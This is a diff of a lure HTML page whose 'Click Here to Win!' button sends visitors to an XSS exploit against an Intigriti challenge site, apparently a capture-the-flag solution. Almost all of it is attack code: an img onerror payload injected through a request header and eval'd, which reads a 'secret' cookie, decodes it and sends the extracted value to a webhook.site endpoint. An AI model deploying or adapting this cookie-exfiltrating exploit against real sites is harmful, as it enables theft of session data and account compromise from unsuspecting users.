@@ -1,53 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Click to Win!</title>
-<style>
-body {
-  margin: 0;
-  padding: 0;
-  height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background-color: #f0f0f0;
-}
-#clickme {
-  padding: 20px 40px;
-  font-size: 24px;
-  cursor: pointer;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-}
-</style>
+    <title>Click for Flag!</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+        }
+        #clickme {
+            padding: 20px 40px;
+            font-size: 24px;
+            cursor: pointer;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+    </style>
 </head>
 <body>
-<button id="clickme">Click for Flag!</button>
+    <button id="clickme">Click Here to Win!</button>
 
-<script>
-document.getElementById('clickme').onclick = function() {
-  const payload = `
-    (function() {
-      const secret = document.cookie.split('secret=')[1]?.split(';')[0];
-      const flag = atob(secret || '').split(':')[1] || '';
-      new Image().src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a/?' + encodeURIComponent(flag);
-    })()
-  `.replace(/\n/g, ' ');
+    <script>
+        document.getElementById('clickme').onclick = function() {
+            const payload = `
+                (function() {
+                    const secret = document.cookie.split('secret=')[1]?.split(';')[0] || '';
+                    const decoded = atob(secret);
+                    const flag = decoded.split(':')[1] || '';
+                    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
+                })()
+            `.replace(/\n/g, ' ').replace(/'/g, "\\'");
 
-  const exploitUrl = 
-    'https://challenge-0325.intigriti.io/note/x#' +
-    encodeURIComponent(
-      `<img src=x onerror="
-        fetch('/api/track', {
-          headers: {'x-user-ip': '${payload.replace(/'/g, "\\'")}'}
-        }).then(r => r.text()).then(eval)
-      ">`
-    );
-  
-  location.href = exploitUrl;
-};
-</script>
+            const exploitUrl = 
+                'https://challenge-0325.intigriti.io/note/x#' +
+                encodeURIComponent(
+                    `<img src=x onerror="
+                        fetch('/api/track', {
+                            headers: {'x-user-ip': '${payload}'}
+                        }).then(r => r.text()).then(t => eval(t))
+                    ">`
+                );
+            
+            window.location.href = exploitUrl;
+        };
+    </script>
 </body>
 </html>
